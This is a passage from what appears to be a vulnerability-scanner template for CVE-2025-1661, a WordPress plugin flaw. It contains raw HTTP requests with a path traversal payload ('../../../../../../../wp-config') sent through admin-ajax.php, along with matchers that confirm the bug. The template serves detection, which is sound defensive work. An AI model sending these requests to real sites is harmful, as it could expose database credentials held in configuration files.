    - contains_all(body, 'options','min_symbols',"..\\/..\\/..\\/..\\/..\\/..\\/..\\/wp-config")
    internal: true
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php?template=../../../../../../../wp-config&value=a&min_symbols=1
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    action=woof_text_search&

    '
- matchers:
  - condition: and
    dsl:
    - contains_all(body, 'options','woof_husky_txt-option-title','woof_husky_txt-option-text','Wrong
      path to template','..\\/..\\/..\\/..\\/..\\/..\\/..\\/wp-configx')
    type: dsl
  raw:
  - 'POST /wp-admin/admin-ajax.php?template=../../../../../../../wp-configx&value=a&min_symbols=1
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    action=woof_text_search&

    '
id: CVE-2025-1661
info:
